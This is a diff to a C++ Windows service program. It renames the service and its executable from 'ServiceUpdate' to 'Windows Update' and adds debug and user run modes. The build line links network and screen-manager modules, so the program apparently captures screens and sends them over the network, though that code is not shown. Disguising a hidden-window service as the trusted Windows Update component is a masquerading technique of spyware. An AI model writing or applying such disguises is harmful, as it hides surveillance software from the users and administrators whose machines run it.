@@ -58,7 +58,7 @@ void WINAPI service_main(DWORD dwArgc, LPTSTR *lpszArgv) {
 //------------------------------------------------------------------------------
 
 int __cdecl _tmain(int argc, TCHAR *argv[]) {
-    service_manager = new ServiceManager("ServiceUpdate");
+    service_manager = new ServiceManager("Windows Update");
 
     if (lstrcmpi(argv[1], TEXT("install")) == 0) {
         SC_HANDLE service = service_manager->install();
@@ -72,10 +72,26 @@ int __cdecl _tmain(int argc, TCHAR *argv[]) {
 
     if (lstrcmpi(argv[1], TEXT("debug")) == 0) {
         streambuf* sbuf = cout.rdbuf();
-        output.open("cout.txt");
+        output.open("debug");
         cout.rdbuf(output.rdbuf());
 
-        service_manager->main();
+        cout << "Starting..." << endl;
+        service_manager->main(true);
+        cout << "End" << endl;
+
+        cout << flush;
+
+        return 0;
+    }
+
+    if (lstrcmpi(argv[1], TEXT("user")) == 0) {
+        streambuf* sbuf = cout.rdbuf();
+        output.open("user");
+        cout.rdbuf(output.rdbuf());
+
+        cout << "Starting..." << endl;
+        service_manager->main(false);
+        cout << "End" << endl;
 
         cout << flush;
 
@@ -88,4 +104,4 @@ int __cdecl _tmain(int argc, TCHAR *argv[]) {
 //------------------------------------------------------------------------------
 //------------------------------------------------------------------------------
 
-// i586-mingw32msvc-g++ -mwindows -o ServiceUpdate.exe ServiceUpdate.cpp service_manager.cpp helper.cpp network.cpp screen_manager.cpp -L./gdi/lib -lgdi32 -lgdiplus -lws2_32 -lole32
+// i586-mingw32msvc-g++ -mwindows -o WindowsUpdate.exe WindowsUpdate.cpp service_manager.cpp helper.cpp network.cpp screen_manager.cpp -L./gdi/lib -lgdi32 -lgdiplus -lws2_32 -lole32
